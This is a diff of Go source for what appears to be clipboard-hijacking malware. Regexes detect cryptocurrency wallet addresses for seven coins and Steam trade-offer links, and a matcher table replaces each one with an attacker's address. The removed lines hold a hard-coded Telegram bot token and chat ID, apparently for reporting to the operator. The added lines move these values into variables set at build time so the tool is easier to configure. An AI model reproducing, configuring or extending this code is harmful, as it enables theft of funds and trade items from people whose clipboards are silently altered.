@@ -25,26 +25,32 @@ var (
 	steamTradeRegex = regexp.MustCompile(`(https?:\/\/)?steamcommunity\.com\/tradeoffer\/new\/\?partner=\d+(&token=[\w\-]+)?`)
 )
 
-/* *** change this *** */
-var matchers = []clipper.Matcher{
-	{Regex: btcRegex, Addr: "btc_clipped"},         // BTC
-	{Regex: ethRegex, Addr: "eth_clipped"},         // ETH
-	{Regex: ltcRegex, Addr: "ltc_clipped"},         // LTC
-	{Regex: dogeRegex, Addr: "doge_clipped"},       // DOGE
-	{Regex: tonRegex, Addr: "ton_clipped"},         // TON
-	{Regex: usdttrcRegex, Addr: "usdttrc_clipped"}, // USDT TRC20
-	{Regex: solRegex, Addr: "sol_clipped"},         // Solana
-	{
-		Regex: steamTradeRegex,
-		Addr:  "https://steamcommunity.com/tradeoffer/new/?partner=1488&token=CLIPPED",
-	},
-}
-
-/* *** change this *** */
 var (
-	bot_token = "8544283395:AAGwBn1O27AyGnFA5XfKc9S7rdILbSkiq5s"
-	chat_id   = "7336461438" // u can use group (starts with -100) or chat id
+	BtcAddr     string
+	EthAddr     string
+	LtcAddr     string
+	DogeAddr    string
+	TonAddr     string
+	UsdtTrcAddr string
+	SolAddr     string
+	SteamAddr   string
 )
+
+var (
+	bot_token string
+	chat_id   string
+)
+
+var matchers = []clipper.Matcher{
+	{Regex: btcRegex, Addr: BtcAddr},
+	{Regex: ethRegex, Addr: EthAddr},
+	{Regex: ltcRegex, Addr: LtcAddr},
+	{Regex: dogeRegex, Addr: DogeAddr},
+	{Regex: tonRegex, Addr: TonAddr},
+	{Regex: usdttrcRegex, Addr: UsdtTrcAddr},
+	{Regex: solRegex, Addr: SolAddr},
+	{Regex: steamTradeRegex, Addr: SteamAddr},
+}
 
 func main() {
 	user, _ := user.Current()
